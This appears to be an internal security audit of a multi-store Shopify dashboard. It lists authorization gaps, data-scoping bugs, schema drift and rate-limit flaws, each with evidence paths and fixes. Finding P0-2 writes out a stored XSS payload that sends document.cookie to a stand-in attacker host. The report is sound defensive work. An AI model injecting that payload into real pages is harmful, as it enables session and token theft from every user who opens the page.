### P0-1 — 7 standalone Vercel routes bez RBAC

**Popis:** RBAC (`hasPermission`/`hasStoreAccess`) je enforced jen v `lib/actions/*` dispatched přes `api/system.js`. **7 standalone routes** jsou wrapped jen `withAuth()` (session check), ale nikde nemají `hasPermission()` ani `hasStoreAccess()`:

- `api/products/list.js` — `store_id` required, ale nikdy verified proti `user.store_access`
- `api/creatives/list.js` — `store_id` **optional** (řádek 26) → omitting = vrátí creatives napříč VŠEMI stores
- `api/creatives/generate.js` — 0 matches na `hasPermission`/`hasStoreAccess` (930 řádků)
- `api/creatives/regenerate.js` — `creative_id` lookup bez store check
- `api/creatives/convert-to-video.js` — 0 matches
- `api/ads/action.js` — approve/reject/pause by `creative_id`, zero store check → **cross-store DELETE** (delete_review path)
- `api/shopify/overview.js` — `store_id` accepted bez ownership check

**Konkrétní risk:** member scoped na Store A může passovat `store_id=StoreB` a přečíst plný product catalog, creative library, Shopify revenue/customers. Může triggerovat placený AI creative generation (fal.ai/Higgsfield/Claude spend) pro jakýkoli produkt v jakémkoli store. Může approve/reject creative guessing `creative_id`.

**Direct contradicts CLAUDE.md's own RBAC section** ("Every action... starts with `hasPermission`") — **true jen pro `lib/actions/*`**, ne pro těchto 7 routes. RLS bypassed protože backend používá service-role key.

**Fix:** add `hasPermission(req.user, 'products:read'|...)` + `hasStoreAccess(req.user, store_id)` ke všem 7 routes. Pro `creatives/list.js`, `ads/action.js`, `creatives/regenerate.js` — resolve `store_id` z DB (creative/product lookup) protože není vždy v requestu.

**Evidence:** `api/products/list.js:9-107`, `api/creatives/list.js:26`, `api/ads/action.js:9-98`, `api/shopify/overview.js:4-70`, `api/creatives/generate.js`, `api/creatives/regenerate.js:10-33`, `api/creatives/convert-to-video.js`

### P0-2 — Stored XSS via `save_skill` → `BrandKnowledge.jsx`

**Popis:** `save_skill` (`lib/actions/skills.js:61-88`) povoluje jakémukoli userovi s `creatives:generate` permission (běžný non-admin permission) zapsat arbitrary text do `store_skills.content`. `BrandKnowledge.jsx` rendruje ten obsah přes hand-rolled `markdownToHtml()` (regex-only, **nikdy** HTML-escapes source text) a injects do DOM přes `dangerouslySetInnerHTML` **bez DOMPurify**.

Payload `<img src=x onerror=fetch('https://evil/steal?c='+document.cookie)>` jako skill content → fire v browser session každého (včetně admina) kdo otevře Brand Knowledge stránku → **session/api_token theft → privilege escalation**.

**OptimizePanel.jsx (řádek 154) použije DOMPurify.sanitize()** ve stejném `dangerouslySetInnerHTML` patternu — dependency už je installed, tohle je jen sanitization gap.

**Fix:** DOMPurify.sanitize() v BrandKnowledge.jsx řádek 244. Zvážit restrikci `save_skill` na admin-only permission.

**Evidence:** `apps/dashboard/src/components/BrandKnowledge.jsx:244,262-271`, `lib/actions/skills.js:61-88`

### P0-3 — Profit P&L mixes ad spend napříč všemi stores

**Popis:** `profit_summary` (`lib/actions/profit.js`) správně scope-uje Shopify revenue + `products.cogs` na requested `store_id`, ale **`manual_adspend` a `performance` (Meta) queries omit `store_id` filter úplně**, přestože `manual_adspend.store_id` FK existuje od `sql/add-stores.sql:37`.

**Konkrétní risk:** každý store's Profit tab **inclusively počítá KAŽDÝ druhý store's manual ad spend** (a Meta spend, jakmile bude live) do jeho ROAS/profit kalkulace. Corrupts real financial numbers used pro business decisions. Nikdo si toho vizuálně nevšimne dokud neaudituje totály.

Bonus: `lib/actions/pricing.js:21-30` `manual_adspend` upsert **nikdy nesetuje `store_id`** — nová manuální data mají NULL attribution (unattributed to jakýkoli store).

**Fix:**
- `.eq('store_id', storeId)` na oba queries v `profit.js:62,65`
- Add `store_id` do insert v `pricing.js:27` (requires caller passes it)
- Backfill/audit existing rows s NULL `store_id` před trust historical P&L

**Evidence:** `lib/actions/profit.js:62,65`, `lib/actions/pricing.js:21-30`, `sql/add-stores.sql:37`

### P0-4 — `products.handle` global UNIQUE — silent sync failure

**Popis:** `sql/products.sql:6-7` definuje `shopify_id` a `handle` jako **globally UNIQUE** (ne composite s `store_id`). `sql/add-stores.sql` později přidal `store_id` FK, ale **nemigroval constrainty na `(store_id, handle)` / `(store_id, shopify_id)`**. `upsertProductFromShopify` targets pouze `onConflict:'shopify_id'`.

**Konkrétní risk:** 4./5. store má produkt s handle `black-dress` nebo `swim-top` (běžné generic slugs) → insert throws Postgres unique violation → `sync.js:150,161` catch swallows do `console.error` (ne `pipeline_log`, ne UI surfacing) → **ten jeden produkt tiše nikdy nesyncne, žádný visible error**.

**Fix:**
- Migrate na `UNIQUE(store_id, handle)` a `UNIQUE(store_id, shopify_id)` (drop global)
- Update upsert `onConflict:'store_id,shopify_id'`
- Change `sync.js` catch aby logovala do `pipeline_log` level=warn (visible failures)

**Evidence:** `sql/products.sql:6-7`, `sql/add-stores.sql:33`, `lib/product-upsert.js:29`, `lib/actions/sync.js:150,161`

### P0-5 — Profit/revenue data gated jen na `products:read`

**Popis:** Profit tab (daily revenue, COGS, margins, per-gateway fees, ad spend) a Shopify analytics tab gated na **stejné `products:read` permission** jako plain product catalog view. **Není separate permission tier pro financial data.**

**Konkrétní risk:** first non-admin collaborator (VA nebo kontraktor dělající product edits) musí mít `products:read` aby viděl Products tab, a ta stejná permission silently unlocks **full margin/profit/ad-spend visibility** pro každý accessible store.

**Fix:** dedicated `finance:read` permission gate Profit.jsx + `profit_summary`/`kpi` separately od `products:read`.

**Evidence:** `apps/dashboard/src/App.jsx:19-29`, `lib/actions/profit.js:15`, `lib/actions/analytics.js:10,26,39`, `lib/permissions.js:4-11`

### P0-7 — `sql/` folder drifted od live schema

**Popis:** `sql/schema.sql:91` definuje `pipeline_log.agent CHECK (agent IN ('SCRAPER','FORGE','PUBLISHER','LOOPER'))`. **Žádný migration file v `sql/` DROP nebo widens tento constraint.** Ale codebase inserts values daleko mimo (OPTIMIZER, REVIEWS, AVATAR, AMAZON_SCRAPER — CLAUDE.md:130).

**Význam:** features jsou documented as shipped and live → constraint musí být altered directly v Supabase (nebo via MCP execute_sql) **bez landing v `sql/`**. Anyone reconstructing DB z `sql/*.sql` (disaster recovery, new staging environment, onboarding developer) dostane schéma **which silently rejects most `pipeline_log` writes** the moment reviews/avatars/optimizer run.

Bonus: `lib/actions/optimizations.js` inserts silently no-op na error (never checks response error) → nikdo by si toho v fresh DB nevšiml než by později debugoval pipeline visibility.

**Fix (S effort):**
- Reverse-engineer live constraint via Supabase SQL Editor: `SELECT pg_get_constraintdef(...)` na `pipeline_log_agent_check`
- Write ho back do `sql/` jako proper migration file
- Do this **předtím než DB je ever rebuilt** nebo second environment spun up

**Evidence:** `sql/schema.sql:89-96`, `CLAUDE.md:130` (agent names in use), grep `sql/*.sql` — no widening migration

### P0-8 — Core rate limits global cross-store/user

**Popis:** `generate`, `regenerate`, `generate_branded`, `optimize_product`, `convert-to-video`, `import_reviews_csv`, `generate_reviews_ai` — všechny keyed s fixed literal string (e.g. `'generate'`, `'optimize_product'`) místo interpolate `store_id` nebo `user_id`.

**Konkrétní risk:** platform-wide shared bucket:
- image generate: **20/hr TOTAL napříč všemi stores a users**
- optimize_product: 30/hr TOTAL
- convert-to-video: 10/hr TOTAL

Jakmile 4. store + 2. person → jeden store's normal daily usage nebo one person's bulk-generate batch **silently 429-blockne KAŽDÝ druhý store/person** na té akci, no per-tenant visibility do why.

**Pattern už existuje v codebase:** `publications.js` (`bulk_publish:${store_id}`), `reviews-amazon.js` (`amazon_scrape:${user_id}`) — jen nebylo aplikováno na těchto 7 endpoints.

**Fix (S effort):**
- Key every generate/optimize/regenerate/convert/import limiter na `${action}:${store_id}` min., + `:${user_id}` pro creative-gen actions
- Raise caps proportionally jakmile 2nd user active

**Evidence:** `lib/rate-limit.js:5-23`, `api/creatives/generate.js:51`, `lib/actions/optimizations.js:39`, `lib/actions/creatives.js:36`, `api/creatives/regenerate.js:16`, `api/creatives/convert-to-video.js:45`, `lib/actions/reviews-import.js:56`, `lib/actions/reviews-ai.js:11`

## P2 — Nice-to-have (polish)

- ✅ **DONE 2026-08-17** — **Shopify OAuth callback**: HMAC verification skipped when `hmac` param absent (fail-open), nonce generated but never validated. Attack path narrow (needs MITM or code-with-stripped-hmac), ale kód by měl fail closed. Fixed: missing `hmac` → `400`; `state` nonce validated against new `oauth_nonces` table (single-use, 10-min TTL) instead of an in-memory Map (CONNECT/CALLBACK are separate serverless invocations). Migration `sql/add-oauth-nonces-table.sql`. Evidence: `api/auth/shopify.js`, `tests/shopify-oauth.test.js`.
- ✅ **DONE 2026-08-17** — **Session token !==** comparison not constant-time (`lib/auth.js:68`) — inconsistent s codebase discipline (`crypto.timingSafeEqual` used in `password.js`, `webhooks/shopify.js`). Fixed: new `safeEqual()` helper (length check + `crypto.timingSafeEqual`), also reused for the `api_token_hash` compare below. Evidence: `lib/auth.js`, `tests/auth.test.js`.
- ✅ **DONE 2026-08-17** — **`api_token` plaintext v DB** (known I-2 tech debt) — hash SHA-256 před generate větším počtu tokens. Fixed: dual-mode migration — `users.api_token_hash` (SHA-256) populated on every new `generate_api_token` call (plaintext `api_token` cleared to `NULL`), existing tokens backfilled via `sql/add-users-api-token-hash.sql` (1 row on prod). `verifyApiToken` looks up by hash first, falls back to plaintext only while `api_token_hash IS NULL` (`console.warn`'d). Follow-up (not this task): drop the plaintext column after a burn-in cycle with zero fallback warnings. Evidence: `lib/actions/users.js`, `lib/auth.js`, `tests/api-token.test.js`.
- **`scrape_style` no SSRF protection** na user URL — apply same allow-list pattern jako reviews-amazon
- **Custom styles Storage path uses `store.name`** místo `store.slug` (unique)

## False Positives (rejected)

**"No explicit Vercel `maxDuration` set — risk of silent truncation below 55s"** — REJECTED. Vercel Hobby plan má 60s **fixed platform ceiling**, unset = already 60s max (ne some lower "default"). `api/system.js` je monolithic handler (dispatched actions), `maxDuration` nelze setovat per action. Team už engineered around this: `IMPORT_CHUNK_SIZE=100`, `MAX_REVIEWS=200` (documented v CLAUDE.md:276) — measured against real 60s ceiling. Finding based on Vercel platform misunderstanding.
